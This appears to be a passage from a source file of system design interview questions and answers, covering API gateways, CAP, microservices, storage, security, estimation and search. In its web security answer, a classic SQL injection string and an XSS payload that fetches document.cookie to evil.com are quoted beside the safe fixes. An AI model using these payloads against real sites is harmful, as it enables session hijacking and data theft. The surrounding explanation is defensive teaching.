+  <div class="arch-row" style="margin-top:4px"><span class="arch-node primary">Web Client</span><span class="arch-arrow">→</span><span class="arch-node warn">API Gateway</span><span class="arch-arrow">→</span><span class="arch-node info">Order Service</span></div>
+  <div class="arch-row" style="margin-top:4px"><span class="arch-node primary">3rd Party</span><span class="arch-arrow">→</span><span class="arch-node warn">API Gateway</span><span class="arch-arrow">→</span><span class="arch-node info">Payment Service</span></div>
+</div>
+<p><strong>What API Gateway handles:</strong></p>
+<ul>
+<li><strong>Authentication & Authorization</strong> — validate JWT/API key before request reaches services</li>
+<li><strong>Rate limiting</strong> — prevent abuse at the edge</li>
+<li><strong>SSL termination</strong> — decrypt HTTPS once, forward HTTP internally</li>
+<li><strong>Request routing</strong> — /api/users → UserService, /api/orders → OrderService</li>
+<li><strong>Load balancing</strong> — distribute across service instances</li>
+<li><strong>Request/response transformation</strong> — reshape payloads, add headers</li>
+<li><strong>Observability</strong> — centralized logging, tracing, metrics</li>
+</ul>
+<div class="callout info"><div class="callout-icon">📍</div><div class="callout-body"><strong>Examples:</strong> AWS API Gateway, Kong, Nginx, Traefik, Envoy. Netflix uses a Zuul gateway that handles 2B+ requests/day with auth, routing, and resilience features.</div></div>`},
+
+// ══════════════════════════════════════════════════════════════════
+// AVAILABILITY & CAP
+// ══════════════════════════════════════════════════════════════════
+{id:'availability',section:'Availability & CAP',icon:'🛡️',level:'intermediate',
+q:'What is the CAP theorem? What does CP vs AP mean in practice?',
+a:`<p>CAP theorem states that a distributed system can only guarantee <strong>2 of 3</strong> properties simultaneously:</p>
+<ul>
+<li><strong>Consistency</strong> — every read sees the most recent write (or an error)</li>
+<li><strong>Availability</strong> — every request gets a (non-error) response, even if it's stale</li>
+<li><strong>Partition Tolerance</strong> — system keeps working even if network splits into disconnected halves</li>
+</ul>
+<p><strong>In practice:</strong> Network partitions happen in any distributed system. So the real choice is <strong>C vs A during a partition</strong>.</p>
+<table class="comp-table">
+<tr><th></th><th>CP (Consistency + Partition Tolerance)</th><th>AP (Availability + Partition Tolerance)</th></tr>
+<tr><td>On partition</td><td>Reject requests to avoid stale reads</td><td>Return stale data rather than error</td></tr>
+<tr><td>Behavior</td><td>Returns error or timeout</td><td>Returns possibly-outdated response</td></tr>
+<tr><td>Best for</td><td>Banking, payments, inventory</td><td>Social media, caching, DNS</td></tr>
+<tr><td>Examples</td><td>HBase, Zookeeper, MongoDB (w/ writeConcern)</td><td>Cassandra, DynamoDB, CouchDB</td></tr>
+</table>
+<div class="callout tip"><div class="callout-icon">💡</div><div class="callout-body"><strong>Real example:</strong> ATM shows stale balance (AP) rather than refusing all transactions during a network outage. But when you submit a bank transfer, it must be CP — you can't double-spend money.</div></div>`},
+
+{id:'availability',section:'Availability & CAP',icon:'🛡️',level:'basic',
+q:'What do availability percentages (nines) mean? How do you calculate downtime?',
+a:`<p>Availability is expressed as a percentage of time the system is operational.</p>
+<div class="metrics-row">
+  <div class="metric-card"><div class="metric-val" style="color:var(--amber)">99%</div><div class="metric-label">2 nines · 87.6h/yr</div></div>
+  <div class="metric-card"><div class="metric-val" style="color:var(--amber)">99.9%</div><div class="metric-label">3 nines · 8.7h/yr</div></div>
+  <div class="metric-card"><div class="metric-val" style="color:var(--green)">99.99%</div><div class="metric-label">4 nines · 52min/yr</div></div>
+  <div class="metric-card"><div class="metric-val" style="color:var(--green)">99.999%</div><div class="metric-label">5 nines · 5.3min/yr</div></div>
+</div>
+<pre>// Availability compounds for chained services
+// If Service A = 99.9% and Service B = 99.9%
+// Combined availability = 99.9% × 99.9% = 99.8%
+
+// Adding redundancy improves availability
+// Two servers in parallel (either can serve):
+// 1 - (1 - 0.999) × (1 - 0.999) = 1 - 0.000001 = 99.9999%</pre>
+<div class="callout warn"><div class="callout-icon">⚠️</div><div class="callout-body"><strong>Important:</strong> 4 nines (99.99%) = ~52 minutes downtime per year. For consumer products, even 1 minute of downtime during peak can cost thousands in revenue. Always design for graceful degradation, not just binary up/down.</div></div>`},
+
+{id:'availability',section:'Availability & CAP',icon:'🛡️',level:'intermediate',
+q:'What are the patterns for high availability? (Circuit Breaker, Bulkhead, Retry)',
+a:`<p>These patterns prevent cascading failures in distributed systems.</p>
+<p><strong>Circuit Breaker</strong> — like an electrical circuit breaker. Monitors failures; when threshold exceeded, "trips" and fast-fails requests without calling the broken service.</p>
+<pre>// Circuit Breaker states
+CLOSED   → requests flow normally; track failure rate
+  ↓ failures > 50% in 10s
+OPEN     → fast-fail all requests immediately (no wait)
+  ↓ after 30s cooldown
+HALF-OPEN → allow 1 probe request; if success → CLOSED
+                                   if failure → OPEN again</pre>
+<p><strong>Bulkhead</strong> — isolate resources per service so one slow service can't exhaust all threads/connections.</p>
+<pre>// Without bulkhead — one slow service kills everything
+Thread pool: 100 threads shared
+ServiceA suddenly slow → takes 100 threads
+ServiceB, ServiceC starved → whole app dies
+
+// With bulkhead — separate pools
+ServiceA pool: 30 threads   // if A is slow, only A suffers
+ServiceB pool: 30 threads
+ServiceC pool: 40 threads</pre>
+<p><strong>Retry with exponential backoff</strong> — retry failed requests, but wait longer between each attempt to avoid hammering a recovering service.</p>
+<pre>attempt 1: immediate
+attempt 2: wait 1s
+attempt 3: wait 2s
+attempt 4: wait 4s  ← plus random jitter to avoid thundering herd</pre>`},
+
+{id:'availability',section:'Availability & CAP',icon:'🛡️',level:'intermediate',
+q:'What is eventual consistency? Give a real-world example.',
+a:`<p>Eventual consistency means <strong>all replicas will converge to the same value given enough time with no new updates</strong>. Reads may return stale data temporarily.</p>
+<pre>// Example: Instagram like count
+User A likes a post → writes to Shard 1 (US-East)
+  Shard 1 count: 1,001
+
+User B reads post → hits Shard 2 (EU-West, not yet synced)
+  Shard 2 count: 1,000  ← stale read, but not wrong!
+
+After replication lag (~100ms):
+  Both shards = 1,001  ← eventually consistent</pre>
+<p><strong>Real examples:</strong></p>
+<ul>
+<li><strong>DNS</strong> — update a DNS record; takes up to 48h to propagate worldwide. Eventually consistent.</li>
+<li><strong>Shopping cart at Amazon</strong> — different regions may show slightly different cart state; resolves on checkout.</li>
+<li><strong>Facebook likes</strong> — like count may differ by a few for seconds; converges quickly.</li>
+<li><strong>Bank balance (NOT okay)</strong> — money transfers must be strongly consistent; eventual = risk of overdraft.</li>
+</ul>
+<div class="callout tip"><div class="callout-icon">💡</div><div class="callout-body"><strong>Key insight:</strong> Eventual consistency is acceptable when stale reads are tolerable. Ask: "Is it okay if the user sees data that's 500ms old?" If yes → eventual consistency is fine. If no (payments, inventory) → use strong consistency.</div></div>`},
+
+// ══════════════════════════════════════════════════════════════════
+// MICROSERVICES
+// ══════════════════════════════════════════════════════════════════
+{id:'microservices',section:'Microservices',icon:'🔧',level:'intermediate',
+q:'What is the difference between monolith and microservices architecture?',
+a:`<table class="comp-table">
+<tr><th></th><th>Monolith</th><th>Microservices</th></tr>
+<tr><td>Deployment</td><td>Deploy entire app as one unit</td><td>Deploy each service independently</td></tr>
+<tr><td>Scaling</td><td>Scale whole app even if one part is hot</td><td>Scale only the bottleneck service</td></tr>
+<tr><td>Tech stack</td><td>One language/framework</td><td>Each service chooses its own</td></tr>
+<tr><td>Communication</td><td>In-process function calls</td><td>Network calls (REST/gRPC/queues)</td></tr>
+<tr><td>Testing</td><td>Easier — test whole app together</td><td>Harder — need contract & integration tests</td></tr>
+<tr><td>Failure</td><td>One bug can crash everything</td><td>Failure isolated to one service</td></tr>
+<tr><td>Team size</td><td>Better for small teams (&lt;15 devs)</td><td>Better for large teams (Conway's Law)</td></tr>
+</table>
+<div class="callout tip"><div class="callout-icon">💡</div><div class="callout-body"><strong>Start with a monolith.</strong> Extract microservices only when you have clear domain boundaries, multiple teams, and proven scaling bottlenecks. "Microservices before product-market fit" is a common costly mistake. Amazon, Netflix, and Uber all started as monoliths.</div></div>`},
+
+{id:'microservices',section:'Microservices',icon:'🔧',level:'intermediate',
+q:'What is service discovery? How do microservices find each other?',
+a:`<p>Service discovery is the mechanism by which services <strong>find the network addresses of other services</strong> without hardcoding IPs (which change constantly in cloud environments).</p>
+<p><strong>Client-side discovery</strong> — client queries a service registry (e.g. Eureka) and load-balances itself.</p>
+<p><strong>Server-side discovery</strong> — client talks to a load balancer; the LB queries the registry. Client doesn't know about registry.</p>
+<div class="arch-box">
+  <div class="arch-title">Service Discovery Flow</div>
+  <div class="arch-row"><span class="arch-node success">OrderService starts</span><span class="arch-arrow">→</span><span class="arch-node warn">Registers in Consul/Eureka</span></div>
+  <div class="arch-row" style="margin-top:6px"><span class="arch-node primary">UserService</span><span class="arch-arrow">→</span><span class="arch-node warn">Ask registry: "Where is OrderService?"</span></div>
+  <div class="arch-row" style="margin-top:6px"><span class="arch-node warn">Registry</span><span class="arch-arrow">→</span><span class="arch-node primary">"OrderService is at 10.0.1.42:8080"</span></div>
+  <div class="arch-row" style="margin-top:6px"><span class="arch-node primary">UserService</span><span class="arch-arrow">→</span><span class="arch-node success">10.0.1.42:8080 (direct call)</span></div>
+</div>
+<div class="callout info"><div class="callout-icon">📍</div><div class="callout-body"><strong>In Kubernetes:</strong> Service discovery is built-in via DNS. <code>order-service.default.svc.cluster.local</code> resolves to the right pod IPs automatically. No external registry needed for in-cluster calls.</div></div>`},
+
+{id:'microservices',section:'Microservices',icon:'🔧',level:'advanced',
+q:'What is the Saga pattern? How do you handle distributed transactions?',
+a:`<p>In microservices, a single business operation spans multiple services. Traditional ACID transactions don't work across services. The <strong>Saga pattern breaks a distributed transaction into a sequence of local transactions</strong>, each publishing events that trigger the next step.</p>
+<pre>// Order Saga — 4 steps across 4 services
+1. OrderService:   Create order (status: PENDING)
+2. PaymentService: Charge card
+3. InventoryService: Reserve items
+4. ShippingService: Schedule delivery
+
+// If step 3 fails (out of stock):
+// Compensating transactions (undo):
+← InventoryService: no-op (never reserved)
+← PaymentService:   Refund card
+← OrderService:     Cancel order (status: CANCELLED)</pre>
+<p><strong>Choreography vs Orchestration:</strong></p>
+<ul>
+<li><strong>Choreography</strong> — services react to events. Decentralized, but hard to visualize flow.</li>
+<li><strong>Orchestration</strong> — a Saga Orchestrator tells each service what to do and tracks state. Centralized, easier to monitor.</li>
+</ul>
+<div class="callout warn"><div class="callout-icon">⚠️</div><div class="callout-body"><strong>Sagas do not provide isolation.</strong> Other transactions can see intermediate states. Design compensating transactions carefully — they must be idempotent. Use for long-running business processes, not sub-second financial transactions where 2PC is acceptable.</div></div>`},
+
+{id:'microservices',section:'Microservices',icon:'🔧',level:'advanced',
+q:'What is a service mesh? What problems does it solve?',
+a:`<p>A service mesh is an <strong>infrastructure layer that handles service-to-service communication</strong> transparently, without changes to application code. It typically uses a sidecar proxy (like Envoy) injected into every service pod.</p>
+<div class="arch-box">
+  <div class="arch-title">Service Mesh (Sidecar Pattern)</div>
+  <div class="arch-row"><span class="arch-node primary">Service A</span><span class="arch-arrow">→</span><span class="arch-node warn">Envoy Sidecar A</span><span class="arch-arrow">→</span><span class="arch-node warn">Envoy Sidecar B</span><span class="arch-arrow">→</span><span class="arch-node primary">Service B</span></div>
+  <div class="arch-row" style="margin-top:8px"><span style="font-size:11px;color:var(--text3)">All traffic passes through sidecar proxies — app code unchanged</span></div>
+</div>
+<p><strong>What service mesh gives you for free:</strong></p>
+<ul>
+<li><strong>mTLS</strong> — automatic mutual TLS encryption between all services</li>
+<li><strong>Observability</strong> — automatic distributed tracing, metrics, logs for every call</li>
+<li><strong>Traffic control</strong> — canary deployments, A/B testing, traffic shifting without code changes</li>
+<li><strong>Retries & circuit breaking</strong> — configured at the mesh level, not per-service</li>
+<li><strong>Load balancing</strong> — L7-aware, health-checked</li>
+</ul>
+<div class="callout info"><div class="callout-icon">📍</div><div class="callout-body"><strong>Popular options:</strong> Istio (most feature-rich), Linkerd (lightweight, Kubernetes-native), Consul Connect. Add a service mesh when you have 20+ services and observability/security becomes hard to manage per-service.</div></div>`},
+
+// ══════════════════════════════════════════════════════════════════
+// STORAGE & CDN
+// ══════════════════════════════════════════════════════════════════
+{id:'storage',section:'Storage & CDN',icon:'💾',level:'basic',
+q:'What is the difference between block storage, file storage, and object storage?',
+a:`<table class="comp-table">
+<tr><th></th><th>Block Storage</th><th>File Storage</th><th>Object Storage</th></tr>
+<tr><td>How it works</td><td>Raw disk blocks; OS formats it</td><td>Hierarchical files/folders</td><td>Flat namespace; key-value store</td></tr>
+<tr><td>Access method</td><td>Mounted as disk (iSCSI, EBS)</td><td>NFS, SMB (network share)</td><td>HTTP REST API (S3)</td></tr>
+<tr><td>Performance</td><td class="yes">Best (low latency, IOPS)</td><td>Good</td><td class="no">Higher latency</td></tr>
+<tr><td>Scalability</td><td>Limited by disk size</td><td>Limited by NAS capacity</td><td class="yes">Virtually unlimited</td></tr>
+<tr><td>Cost</td><td>Expensive</td><td>Medium</td><td class="yes">Cheapest per GB</td></tr>
+<tr><td>Best for</td><td>DB storage, VMs, OS volumes</td><td>Shared team files, home dirs</td><td>Images, videos, backups, logs</td></tr>
+<tr><td>Examples</td><td>AWS EBS, GCP PD</td><td>AWS EFS, Azure Files</td><td>AWS S3, GCS, Cloudflare R2</td></tr>
+</table>
+<div class="callout tip"><div class="callout-icon">💡</div><div class="callout-body"><strong>Rule of thumb:</strong> Databases → Block (EBS). Shared config/code across servers → File (EFS). User uploads, media, ML datasets, logs → Object (S3). When in doubt, S3 is the right answer for anything that isn't a running DB.</div></div>`},
+
+{id:'storage',section:'Storage & CDN',icon:'💾',level:'intermediate',
+q:'How does a distributed file system work? (HDFS / GFS)',
+a:`<p>A distributed file system (DFS) stores <strong>large files split into blocks across many machines</strong>, with automatic replication for fault tolerance.</p>
+<pre>// HDFS architecture
+NameNode: metadata server — knows which blocks are on which DataNode
+DataNode: stores actual file blocks (128MB default)
+
+// Storing a 400MB file:
+File → [Block 0 (128MB), Block 1 (128MB), Block 2 (144MB)]
+NameNode assigns each block to 3 DataNodes (replication factor=3):
+  Block 0 → DataNode 1, 4, 7
+  Block 1 → DataNode 2, 5, 8
+  Block 2 → DataNode 3, 6, 9
+
+// Reading:
+Client asks NameNode: "Where is Block 1?"
+NameNode: "On DataNode 2, 5, or 8"
+Client reads from closest DataNode directly</pre>
+<div class="arch-box">
+  <div class="arch-title">HDFS Architecture</div>
+  <div class="arch-row"><span class="arch-node primary">Client</span><span class="arch-arrow">→</span><span class="arch-node warn">NameNode (metadata)</span></div>
+  <div class="arch-row" style="margin-top:6px"><span class="arch-node primary">Client</span><span class="arch-arrow">→</span><span class="arch-node info">DataNode 1</span><span class="arch-arrow">→</span><span class="arch-node info">DataNode 2</span><span class="arch-arrow">→</span><span class="arch-node info">DataNode 3</span><span class="arch-arrow" style="color:var(--green)">✓ replicated</span></div>
+</div>
+<div class="callout warn"><div class="callout-icon">⚠️</div><div class="callout-body"><strong>NameNode is SPOF:</strong> In early HDFS, NameNode failure meant filesystem unavailable. HDFS 2.x introduced NameNode HA with standby. Always run with NameNode HA in production.</div></div>`},
+
+{id:'storage',section:'Storage & CDN',icon:'💾',level:'intermediate',
+q:'How do you design a system to handle file uploads efficiently? (e.g. S3 multipart upload)',
+a:`<p>For large file uploads, sending everything in one HTTP request is fragile — any network interruption fails the whole upload. <strong>Multipart upload breaks large files into chunks uploaded in parallel.</strong></p>
+<div class="arch-box">
+  <div class="arch-title">Optimal Upload Architecture</div>
+  <div class="arch-row"><span class="arch-node primary">Browser</span><span class="arch-arrow">→</span><span class="arch-node warn">Backend: GET presigned URL</span></div>
+  <div class="arch-row" style="margin-top:6px"><span class="arch-node primary">Browser</span><span class="arch-arrow">→</span><span class="arch-node success">S3 Direct Upload (presigned URL)</span><span class="arch-arrow" style="color:var(--text3)">← bypasses your server!</span></div>
+  <div class="arch-row" style="margin-top:6px"><span class="arch-node success">S3</span><span class="arch-arrow">→</span><span class="arch-node info">SNS/SQS Event</span><span class="arch-arrow">→</span><span class="arch-node warn">Processing Worker</span></div>
+</div>
+<pre>// Step 1: Get presigned URL from backend (auth happens here)
+GET /api/upload-url?filename=video.mp4&size=500MB
+← { uploadUrl: "https://s3.aws.../video.mp4?X-Amz-Signature=...",
+    uploadId: "abc123" }
+
+// Step 2: Client uploads directly to S3
+// No bandwidth cost on your backend!
+PUT uploadUrl body=file_data
+
+// For files > 100MB: multipart upload
+// Split into 5MB+ chunks, upload in parallel (6 threads)
+// S3 assembles them server-side — 6x faster upload</pre>
+<div class="callout tip"><div class="callout-icon">💡</div><div class="callout-body"><strong>Always use presigned URLs + direct-to-S3 upload</strong> for anything over 1MB. Your server should never be in the data path for uploads — it wastes bandwidth, CPU, and introduces a chokepoint.</div></div>`},
+
+// ══════════════════════════════════════════════════════════════════
+// SECURITY
+// ══════════════════════════════════════════════════════════════════
+{id:'security',section:'Security',icon:'🔐',level:'basic',
+q:'What is the difference between authentication and authorization?',
+a:`<p><strong>Authentication (AuthN)</strong> — verifying <em>who you are</em>. Proves identity.</p>
+<p><strong>Authorization (AuthZ)</strong> — verifying <em>what you can do</em>. Enforces permissions.</p>
+<pre>// Authentication — "Who are you?"
+POST /login { email, password }
+→ Verify credentials → Issue JWT token
+
+// Authorization — "Are you allowed to do this?"
+GET /admin/users
+→ Token is valid (authenticated ✓)
+→ User role = "viewer", not "admin" → 403 Forbidden (not authorized)
+
+// Real example:
+You log into Gmail — Authentication (you proved who you are)
+You can read YOUR emails but not others' — Authorization
+Admin can see all emails — different Authorization level</pre>
+<div class="arch-box">
+  <div class="arch-title">JWT Authentication Flow</div>
+  <div class="arch-row"><span class="arch-node primary">Client</span><span class="arch-arrow">→</span><span class="arch-node warn">POST /login</span><span class="arch-arrow">→</span><span class="arch-node success">JWT Token ←</span></div>
+  <div class="arch-row" style="margin-top:6px"><span class="arch-node primary">Client</span><span class="arch-arrow">→</span><span class="arch-node warn">GET /resource + JWT</span><span class="arch-arrow">→</span><span class="arch-node info">Verify JWT (no DB hit!)</span><span class="arch-arrow">→</span><span class="arch-node success">200 OK</span></div>
+</div>
+<div class="callout tip"><div class="callout-icon">💡</div><div class="callout-body"><strong>JWT advantage:</strong> Stateless — server doesn't need to store session. Scales horizontally. Any server can verify a JWT using the shared secret. Trade-off: can't invalidate a JWT before it expires (need a token blacklist or short TTL).</div></div>`},
+
+{id:'security',section:'Security',icon:'🔐',level:'intermediate',
+q:'What is OAuth 2.0? How does "Login with Google" work?',
+a:`<p>OAuth 2.0 is an <strong>authorization framework</strong> that lets a user grant a third-party app limited access to their account on another service, without sharing their password.</p>
+<pre>// "Login with Google" flow (Authorization Code Grant):
+
+1. User clicks "Login with Google" on your app
+2. Your app redirects to:
+   https://accounts.google.com/o/oauth2/auth
+   ?client_id=YOUR_APP_ID
+   &redirect_uri=https://yourapp.com/callback
+   &scope=email profile
+   &response_type=code
+
+3. Google shows consent screen: "YourApp wants your email + profile"
+4. User clicks "Allow"
+
+5. Google redirects to: https://yourapp.com/callback?code=AUTH_CODE
+6. Your backend exchanges code for tokens:
+   POST https://oauth2.googleapis.com/token
+   { code, client_id, client_secret, ... }
+   ← { access_token, id_token, refresh_token }
+
+7. Your backend calls Google API with access_token to get user info
+8. Log user in or create account</pre>
+<div class="callout info"><div class="callout-icon">📍</div><div class="callout-body"><strong>OAuth vs OpenID Connect (OIDC):</strong> OAuth 2.0 is for authorization (access to resources). OIDC adds an identity layer (who the user is, via id_token). "Login with Google" is OIDC built on top of OAuth 2.0.</div></div>`},
+
+{id:'security',section:'Security',icon:'🔐',level:'intermediate',
+q:'What are common web security vulnerabilities and how do you prevent them?',
+a:`<p>Every web system must defend against these common attack vectors:</p>
+<ul>
+<li><strong>SQL Injection</strong> — attacker injects SQL into input to manipulate queries.</li>
+</ul>
+<pre>// VULNERABLE
+query = "SELECT * FROM users WHERE name = '" + input + "'"
+// Input: "' OR '1'='1" → returns all users!
+
+// SAFE — parameterized query
+db.query("SELECT * FROM users WHERE name = ?", [input])</pre>
+<ul>
+<li><strong>XSS (Cross-Site Scripting)</strong> — attacker injects JavaScript into a page to steal session tokens.</li>
+</ul>
+<pre>// VULNERABLE — render user input as HTML
+&lt;div&gt;\${userComment}&lt;/div&gt;
+// If comment is: &lt;script&gt;fetch('evil.com?c='+document.cookie)&lt;/script&gt;
+
+// SAFE — escape all user input; use textContent not innerHTML
+element.textContent = userComment   // browser won't execute as script</pre>
+<ul>
+<li><strong>CSRF (Cross-Site Request Forgery)</strong> — tricked into making requests as you. Prevented by CSRF tokens or SameSite cookies.</li>
+<li><strong>Broken Auth</strong> — weak passwords, no MFA, long-lived tokens. Use bcrypt for passwords, short JWT TTL, enforce MFA.</li>
+<li><strong>Sensitive data exposure</strong> — never store plain text passwords, log PII, or send secrets in URLs.</li>
+<li><strong>IDOR (Insecure Direct Object Reference)</strong> — <code>GET /invoices/1234</code> — can you access invoice 1235? Always authorize access to specific resources.</li>
+</ul>
+<div class="callout warn"><div class="callout-icon">⚠️</div><div class="callout-body"><strong>OWASP Top 10</strong> is the reference list of most critical security risks. Review it for every new system. Most breaches come from basic failures: unparameterized queries, missing auth checks, secrets in code.</div></div>`},
+
+// ══════════════════════════════════════════════════════════════════
+// ESTIMATION
+// ══════════════════════════════════════════════════════════════════
+{id:'estimation',section:'Estimation',icon:'🔢',level:'basic',
+q:'How do you approach back-of-envelope calculations in a system design interview?',
+a:`<p>Back-of-envelope (BOE) estimation helps you <strong>choose the right technology and identify bottlenecks before designing</strong>. Use these steps:</p>
+<pre>// Framework: DAU → RPS → Storage → Bandwidth
+
+Step 1: Users / DAU
+  "10M DAU, each makes 10 requests/day"
+  RPS = (10M × 10) / 86400 ≈ 1,160 RPS average
+  Peak RPS = average × 3 = ~3,500 RPS
+
+Step 2: Storage
+  "Each request generates 1KB of data, stored 1 year"
+  Daily writes = 10M × 10 × 1KB = 100GB/day
+  Yearly = 100GB × 365 = ~36TB/year
+
+Step 3: Bandwidth  
+  "Average response = 10KB"
+  Outgoing bandwidth = 3,500 RPS × 10KB = 35MB/s = 280Mbps
+
+Step 4: Decisions
+  3,500 RPS → single PostgreSQL (5k QPS cap) → fine for now
+  36TB → S3 (cheap, ~$0.02/GB = $720/year) 
+  280Mbps → 1Gbps NIC is fine, CDN would help</pre>
+<div class="callout tip"><div class="callout-icon">💡</div><div class="callout-body"><strong>Key numbers to memorize:</strong> 1 day = 86,400s ≈ 100K. 1M users × 1 action/day ≈ 12 RPS. 1B requests/day ≈ 12K RPS. 1KB × 1B = 1TB. These let you do mental math in 30 seconds.</div></div>`},
+
+{id:'estimation',section:'Estimation',icon:'🔢',level:'intermediate',
+q:'Estimate the storage requirements for a Twitter-like system.',
+a:`<pre>// Twitter-like system estimation
+
+=== ASSUMPTIONS ===
+DAU:          300M users
+Tweets/day:   100M new tweets
+Tweet size:   280 chars ≈ 500 bytes (with metadata)
+Media:        10% of tweets have image (~200KB avg)
+Retention:    Forever (append-only)
+
+=== STORAGE ===
+Text tweets per day:
+  100M tweets × 500 bytes = 50GB/day
+
+Media per day:
+  10M tweets with images × 200KB = 2TB/day
+
+Total daily write:
+  ~2.05TB/day
+
+5-year storage:
+  2.05TB × 365 × 5 ≈ 3.7PB
+  → Use object storage (S3) for media
+  → Use distributed DB for tweet metadata
+
+=== READ THROUGHPUT ===
+Timeline loads:
+  300M users × 20 reads/day = 6B reads/day
+  6B / 86400 ≈ 70,000 RPS peak
+  → Redis cache for hot timelines
+  → Sharded DB for cold data
+
+=== BANDWIDTH ===
+Avg tweet response (text only): 500B × 70K RPS = 35MB/s
+With media: ~1Gbps sustained at CDN edge</pre>
+<div class="callout info"><div class="callout-icon">📍</div><div class="callout-body"><strong>Interview tip:</strong> State assumptions clearly and out loud. Interviewers want to see your reasoning process, not a perfect number. Being off by 2x is fine. Being able to say "this means we need a CDN, not just a single server" is what they're evaluating.</div></div>`},
+
+{id:'estimation',section:'Estimation',icon:'🔢',level:'intermediate',
+q:'Estimate the QPS and infrastructure for WhatsApp-scale messaging.',
+a:`<pre>// WhatsApp Estimation
+
+=== ASSUMPTIONS ===
+DAU:           2B users
+Active at peak: 10% = 200M concurrent
+Messages/day:  100B (50 per user)
+Avg message:   100 bytes
+
+=== MESSAGE THROUGHPUT ===
+100B messages / 86400s = ~1.16M messages/second
+Peak (3x):               ~3.5M msg/sec
+
+=== STORAGE ===
+100B msgs/day × 100 bytes = 10TB/day text
+Media (30% msgs × 50KB avg) = 1.5PB/day
+
+=== INFRASTRUCTURE ===
+Message fanout workers: 
+  3.5M/sec × avg 2 recipients = 7M writes/sec to inbox
+  → Cassandra (10K-100K writes/sec per node)
+  → Need ~100-700 Cassandra nodes
+
+WebSocket connections:
+  200M concurrent users
+  → 1 server handles ~50K connections
+  → 200M / 50K = 4,000 connection servers
+  → Use connection multiplexing via XMPP/WebSocket
+
+Storage (messages kept 30 days):
+  10TB/day × 30 = 300TB text only
+  Media: stored on device / S3 + deleted from servers</pre>
+<div class="callout warn"><div class="callout-icon">⚠️</div><div class="callout-body"><strong>Key insight:</strong> WhatsApp famously ran on ~50 engineers for 2B users by using Erlang (handles millions of connections per server), keeping messages off-server (only pass-through), and end-to-end encryption (no content inspection overhead).</div></div>`},
+
+// ══════════════════════════════════════════════════════════════════
+// SEARCH & INDEXING
+// ══════════════════════════════════════════════════════════════════
+{id:'search',section:'Search & Indexing',icon:'🔎',level:'intermediate',
+q:'How does a search engine work at a high level?',
+a:`<p>A search engine turns documents into an <strong>inverted index</strong>: instead of document → words, it stores word → documents. This makes keyword lookup fast.</p>
+<div class="arch-box">
+  <div class="arch-title">Search Pipeline</div>
+  <div class="arch-row"><span class="arch-node primary">Documents</span><span class="arch-arrow">→</span><span class="arch-node warn">Tokenizer</span><span class="arch-arrow">→</span><span class="arch-node info">Inverted Index</span><span class="arch-arrow">→</span><span class="arch-node success">Ranked Results</span></div>
+</div>
+<pre>// Documents
+doc1: "iphone 15 pro case"
+doc2: "iphone charger cable"
+doc3: "samsung phone case"
+
+// Inverted index
+iphone  → [doc1, doc2]
+case    → [doc1, doc3]
+charger → [doc2]
+
+// Query: "iphone case"
+candidate docs = intersection/union of [doc1, doc2] and [doc1, doc3]
+rank doc1 highest because it matches both terms</pre>
+<p><strong>Ranking signals:</strong> term frequency, inverse document frequency, field boosts (title &gt; body), freshness, popularity, personalization, and business rules.</p>
+<div class="callout tip"><div class="callout-icon">💡</div><div class="callout-body"><strong>Interview answer:</strong> Use Elasticsearch/OpenSearch/Solr for full-text search. Keep your primary database as source of truth, then asynchronously index changes into the search cluster.</div></div>`},
+
+{id:'search',section:'Search & Indexing',icon:'🔎',level:'intermediate',
+q:'How do you keep a search index in sync with the database?',
+a:`<p>The search index is a read model, not the source of truth. The hard part is keeping it fresh without coupling user writes to the search cluster.</p>
+<table class="comp-table">
+<tr><th>Approach</th><th>How it works</th><th>Trade-off</th></tr>
+<tr><td>Synchronous write</td><td>Write DB then search index in request path</td><td>Fresh, but user write fails if search is down</td></tr>
+<tr><td>Async event</td><td>DB write emits event; worker updates index</td><td>Reliable and scalable, but eventually consistent</td></tr>
+<tr><td>CDC</td><td>Read DB commit log via Debezium/Kafka</td><td>Best for correctness, more moving parts</td></tr>
+<tr><td>Batch reindex</td><td>Periodic full rebuild</td><td>Simple fallback, stale between runs</td></tr>
+</table>
+<div class="arch-box">
+  <div class="arch-title">Async Indexing</div>
+  <div class="arch-row"><span class="arch-node primary">Product API</span><span class="arch-arrow">→</span><span class="arch-node success">PostgreSQL</span><span class="arch-arrow">→</span><span class="arch-node warn">Kafka product.updated</span><span class="arch-arrow">→</span><span class="arch-node info">Indexer Worker</span><span class="arch-arrow">→</span><span class="arch-node success">Elasticsearch</span></div>
+</div>
+<pre>// User updates product title
+1. Update products table in PostgreSQL
+2. Publish product.updated event with productId and version
+3. Indexer fetches latest product row
+4. Upsert into Elasticsearch with same version
+
+// If indexing fails:
+retry with backoff → DLQ after max attempts → alert and replay later</pre>
+<div class="callout warn"><div class="callout-icon">⚠️</div><div class="callout-body"><strong>Important:</strong> Make index updates idempotent and versioned. If event 10 arrives before event 9, the index should keep version 10 and ignore the older update.</div></div>`},
+
+{id:'search',section:'Search & Indexing',icon:'🔎',level:'advanced',
+q:'How do autocomplete and typeahead suggestions work?',
+a:`<p>Autocomplete must return suggestions in tens of milliseconds while users are typing. It usually uses a prefix index, trie, or specialized search index.</p>
+<ul>
+<li><strong>Trie</strong> — tree of characters. Fast prefix lookup, memory-heavy.</li>
+<li><strong>Edge n-grams</strong> — index prefixes like "iph", "ipho", "iphon". Easy in Elasticsearch.</li>
+<li><strong>Popularity ranking</strong> — rank "iphone" above rare terms based on search count, CTR, inventory, or geography.</li>
+</ul>
+<pre>// Query suggestions
+Input: "iph"
+Candidates: iphone, iphone 15, iphone case, iphone charger
+Rank by:
+  popularity score
+  personalization
+  availability
+  spelling correction
+
+// Cache hot prefixes
+Redis key: suggest:iph → top 10 suggestions, TTL 5 min</pre>
+<div class="arch-box">
+  <div class="arch-title">Typeahead Architecture</div>
+  <div class="arch-row"><span class="arch-node primary">Browser</span><span class="arch-arrow">→</span><span class="arch-node warn">Suggest API</span><span class="arch-arrow">→</span><span class="arch-node info">Redis Hot Prefix Cache</span><span class="arch-arrow">→</span><span class="arch-node success">Search Index</span></div>
+</div>
+<div class="callout tip"><div class="callout-icon">💡</div><div class="callout-body"><strong>Frontend detail:</strong> Debounce keystrokes by 100-200ms and cancel old requests. Without debounce, one user typing "iphone" can create six API calls.</div></div>`},
+
+{id:'search',section:'Search & Indexing',icon:'🔎',level:'advanced',
+q:'What is vector search and when do you use it?',
+a:`<p>Vector search finds items by <strong>semantic similarity</strong> rather than exact keyword match. Text, images, audio, or products are converted into numeric embeddings; similar meaning appears close in vector space.</p>
+<pre>// Keyword search
+Query: "cheap running shoes"
+Matches documents containing cheap/running/shoes
+
+// Vector search
